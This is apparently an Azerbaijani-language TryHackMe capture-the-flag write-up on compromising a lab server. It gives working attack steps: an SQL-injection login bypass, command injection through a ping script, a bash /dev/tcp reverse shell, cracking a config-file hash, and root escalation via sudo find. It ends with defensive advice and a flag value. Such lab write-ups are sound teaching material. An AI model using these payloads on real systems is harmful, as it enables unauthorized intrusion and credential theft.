# 🔐 TryHackMe — Operation Promotion
### Penetration Test Hesabatı (CTF Writeup)

---

## 📋 Ümumi Məlumat

| Sahə | Dəyər |
|---|---|
| **Platform** | TryHackMe |
| **Otaq adı** | Operation Promotion |
| **Hədəf şirkət** | RecruitCorp |
| **Çətinlik** | Orta |
| **OS** | Linux (Ubuntu) |
| **Məqsəd** | User flag + Root flag əldə etmək |

---

## 🗺️ Hücum Xəritəsi (Attack Path)

```
Nmap Skan
   ↓
robots.txt → /admin/ tapıldı
   ↓
SQL Injection → Admin panelə giriş
   ↓
lookup.php → sysmaint istifadəçisi tapıldı
   ↓
ping.php → Command Injection
   ↓
Reverse Shell (www-data)
   ↓
db.conf → jford hash tapıldı
   ↓
John the Ripper → spring2026!
   ↓
SSH (jford) → user.txt 🚩
   ↓
sudo -l → find (NOPASSWD)
   ↓
GTFOBins → Root Shell → flag.txt 🚩
```

---

## 🔍 1. Kəşfiyyat (Reconnaissance)

### Port Skanlaması

```bash
nmap -p- --min-rate 5000 -T4 <HEDEF_IP>
```

**Nəticə — açıq portlar:**

| Port | Servis | Versiya |
|---|---|---|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache |
| 139 | SMB | Samba |
| 445 | SMB | Samba |

**Niyə bu komanda?**
- `-p-` → bütün 65535 portu skan edir (default 1000 deyil)
- `--min-rate 5000` → saniyədə minimum 5000 paket göndərir, skan sürətlənir
- `-T4` → "aggressive" rejim, daha sürətli

### Servis Versiyaları

```bash
nmap -sCV -p22,80,139,445 <HEDEF_IP>
```

**Niyə?**
- `-sC` → standart skriptlər işlədir (məs. `robots.txt` aşkar edir)
- `-sV` → hər portu dəqiq versiyasını tapır

---

## 🌐 2. Veb Kəşfiyyatı

### robots.txt Faylı

Brauzerdə açılır: `http://<IP>/robots.txt`

```
User-agent: *
Disallow: /admin/
```

**Nə öyrəndik?**
Bu fayl axtarış robotlarına "buraya girmə" deyir. Amma biz bura girmək istəyirik — `/admin/` yolu tapıldı!

### Qovluq Axtarışı (Directory Bruteforce)

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

**Tapılanlar:**
- `/admin` → Admin panel
- `/config` → Konfiqurasiya faylları

---

## 💉 3. SQL Injection — Admin Panelə Giriş

`http://<IP>/admin/` — login forması var.

### Normal vəziyyətdə arxa planda nə baş verir?

```sql
SELECT * FROM users 
WHERE username = 'daxil_etdiyin' 
AND password = 'daxil_etdiyin'
```

### Bizim hücum:

| Sahə | Daxil edilən dəyər |
|---|---|
| Username | `' OR '1'='1' --` |
| Password | `a` |

### Arxa planda sorğu belə olur:

```sql
SELECT * FROM users 
WHERE username = '' OR '1'='1' --' AND password = 'a'
```

**İzah:**
- `'` → orijinal dırnağı bağlayır, SQL kodumuz başlayır
- `OR '1'='1'` → həmişə **doğrudur** (TRUE), bütün istifadəçilər qaytarılır
- `--` → bundan sonrakı hər şey şərh (comment) sayılır, şifrə yoxlanmır

**Nəticə:** Server bizi admin kimi içəri buraxır — şifrəsiz!

---

## 🎯 4. Command Injection — ping.php

Admin paneldə `lookup.php?id=7` vasitəsilə `sysmaint` istifadəçisi tapıldı. Qeyddə yazılıb ki, bu hesab `/admin/sysmaint-checks/ping.php` faylını işlədir.

### ping.php necə işləyir?

```
http://<IP>/admin/sysmaint-checks/ping.php?host=8.8.8.8
```

Arxa planda server bu əmri icra edir:

```bash
ping 8.8.8.8
```

### Hücum — əlavə əmr qoşmaq:

```
http://<IP>/admin/sysmaint-checks/ping.php?host=8.8.8.8;whoami
```

Arxa planda:

```bash
ping 8.8.8.8; whoami
```

`;` işarəsi "birinci əmri bitir, ikincini icra et" deməkdir. `www-data` çıxdı — **Command Injection işləyir!**

**Problem niyə baş verdi?**
Proqramçı `host=` parametrini filtrsiz birbaşa sistem əmrinə yapışdırdı. İstifadəçi girişi heç vaxt əməliyyat sistemi əmrinə birbaşa verilməməlidir.

---

## 🐚 5. Reverse Shell

### Nədir Reverse Shell?

Normal hücumda biz serverə qoşulurıq. **Reverse shell**-də isə server bizə qoşulur — bu, firewall-ları keçmək üçün istifadə olunur.

### Kali-də dinləyici açmaq:

```bash
nc -lvnp 4445
```

**İzah:**
- `-l` → gələn bağlantını dinlə (listen)
- `-v` → ətraflı çıxış (verbose)
- `-n` → DNS sorğusu etmə
- `-p 4445` → 4445 portunu dinlə

### Brauzerdə payload:

```
http://<IP>/admin/sysmaint-checks/ping.php?host=8.8.8.8%3Bbash+-c+'bash+-i+>%26+/dev/tcp/<KALİ_IP>/4445+0>%261'
```

**`%3B` = `;`, `%26` = `&` → URL encoding**

### Arxa planda nə baş verir?

```bash
ping 8.8.8.8; bash -c 'bash -i >& /dev/tcp/<KALİ_IP>/4445 0>&1'
```

- `bash -i` → interaktiv bash açır
- `/dev/tcp/IP/PORT` → Linux-un TCP bağlantı xüsusiyyəti
- `>& ... 0>&1` → bütün giriş/çıxışı TCP üzərindən yönləndirir

**Nəticə:** `www-data@recruitcorp` — serverdə shell!

---

## 🔑 6. Konfiqurasiya Faylında Hash Tapılması

```bash
cat /var/www/html/config/db.conf
```

**Çıxış:**

```
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

**Nə tapıldı?**
- İstifadəçi adı: `jford`
- Şifrə hash-i: `$2b$10$...` → **bcrypt** formatı

**bcrypt nədir?**
Güclü şifrələmə alqoritmidir — şifrəni birbaşa oxumaq olmur. Krek etmək lazımdır.

---

## 🔓 7. Hash Krekləmə (Password Cracking)

### İstifadə olunan alət: John the Ripper

```bash
echo '$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq' > hash.txt

john hash.txt --wordlist=wordlist.txt --format=bcrypt
```

### Wordlist məntiqi:

Şifrə siyasəti mövsüm + il + xüsusi simvol naxışına uyğun gəlir:
`spring`, `summer`, `winter`, `autumn` + `2024/2025/2026` + `!`

**Nəticə:**

```
spring2026!      (jford)
```

**Tapılan şifrə: `spring2026!`**

---

## 👤 8. SSH ilə Giriş — User Flag

```bash
ssh jford@<IP>
# şifrə: spring2026!

cat user.txt
```

### 🚩 User Flag:
```
THM{bdbee0a91ebcb0b0fafde931223efe09}
```

---

## 👑 9. Privilege Escalation — Root Olmaq

### Sudo icazələrini yoxla:

```bash
sudo -l
```

**Çıxış:**

```
User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

**Nə deməkdir?**
`jford` istifadəçisi **şifrəsiz** olaraq `find` əmrini **root kimi** işlədə bilir.

### GTFOBins istifadəsi

[GTFOBins](https://gtfobins.github.io) — Linux proqramlarının privilege escalation üçün necə istifadə edilə biləcəyini göstərən sayt.

`find` → Sudo bölməsi:

```bash
sudo find . -exec /bin/bash \; -quit
```

**Niyə işləyir?**
- `find` root kimi işləyir
- `-exec /bin/bash` → `find` vasitəsilə bash açılır
- Açılan bash da **root** olur (çünki onu root açıb)

**Nəticə:** `root@recruitcorp` — **ROOT OLUNDU!**

---

## 🏁 10. Root Flag

```bash
cat /root/flag.txt
```

### 🚩 Root Flag tapıldı!

---

## 📚 Öyrənilən Texnikalar

| Texnika | İzah | Alət |
|---|---|---|
| Port Skan | Hədəf serverdə hansı portlar açıqdır | `nmap` |
| Directory Bruteforce | Gizli veb qovluqları tapmaq | `gobuster` |
| SQL Injection | Login formasını bypass etmək | Manual |
| Command Injection | Server üzərində əmr icra etmək | Manual |
| Reverse Shell | Serverdən bizə bağlantı açmaq | `nc`, `bash` |
| Hash Krekləmə | Şifrəni hash-dən tapmaq | `john` |
| Privilege Escalation | Normal istifadəçidən root olmaq | GTFOBins |

---

## 🛡️ Müdafiə Tövsiyələri

1. **SQL Injection** → Parametrləri həmişə sanitize et, Prepared Statements istifad et
2. **Command Injection** → İstifadəçi girişini heç vaxt sistem əmrinə birbaşa vermə
3. **Şifrə siyasəti** → Mövsüm-əsaslı şifrələr (spring2026!) zəifdir, güclü random şifrə istifadə et
4. **Konfiqurasiya faylları** → Şifrə hash-lərini veb serverin əlçatan qovluğunda saxlama
5. **Sudo icazələri** → `find` kimi proqramlara NOPASSWD icazəsi vermə

---

## 🔗 İstifadəli Mənbələr

- [GTFOBins](https://gtfobins.github.io) — Sudo/SUID privilege escalation
- [RevShells](https://revshells.com) — Reverse shell generator
- [HackTricks](https://book.hacktricks.xyz) — Pentesting metodologiyası

---

*Bu hesabat yalnız təhsil məqsədilə hazırlanmışdır. Yalnız icazə verilmiş sistemlərə qarşı istifadə edin.*
